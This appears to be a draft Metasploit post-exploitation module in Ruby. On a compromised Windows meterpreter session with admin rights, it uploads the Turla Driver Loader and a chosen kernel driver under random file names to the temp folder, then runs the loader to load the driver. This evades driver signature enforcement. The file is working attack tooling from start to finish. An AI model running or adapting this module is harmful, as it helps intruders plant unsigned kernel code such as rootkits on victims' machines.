##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'tdl stuff',
      'Description'   => %q{
          This does a thing to the stuff with the turla driver loader.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'wvw <wut@wut.com>'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptString.new('DRIVER', [false,'Driver file to install']),
      OptPath.new('TDL', [false,'Path to Turla Driver Loader',])
    ])

  end

  def upload_stuff(file, rfilename, directory="c:\\windows\\temp\\")
    begin
      print_status("File #{directory + rfilename} being uploaded..")
      write_file(directory + rfilename, file)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Error uploading file #{directory + rfilename}: #{e.class} #{e}")
    end
  end

  def run

    if datastore['DRIVER']
      print_status("Using driver file #{datastore['DRIVER']}")
      driver_local = File.open(datastore['DRIVER'])
    else
      driver_local = File.open(File.join(Msf::Config.local_directory, "tdl", "drv.sys"))
    end

    if datastore['TDL']
      print_status("Using TDL executable #{datastore['TDL']}")
      tdl_local = File.open(datastore['TDL'])
    else
      tdl_local = File.open(File.join(Msf::Config.local_directory, "tdl", "Furutaka.exe"))
    end
 
    unless ((is_admin?) && session.platform.include?("windows"))
      fail_with(Failure::None, 'Insufficient privileges or unsupported operating system')
    end

    
    hfile = tdl_local.read
    tdl_rfile = Rex::Text.rand_text_alpha_lower(8) + ".exe"
    tdl_local.close

    
    hdrv = driver_local.read
    driver_rfile = Rex::Text.rand_text_alpha_lower(8) + ".sys"
    driver_local.close

    print_status("Uploading Turla driver loader ...")
    upload_stuff(hfile, tdl_rfile)

    print_status("Uploading driver ....")
    upload_stuff(hdrv, driver_rfile)

    print_status("Executing TDL ...")

    # be sure this is /C in release
    cmd_exec("cmd.exe /C start c:\\windows\\temp\\#{tdl_rfile} c:\\windows\\temp\\#{driver_rfile} & pause", nil, 5)
  end

end
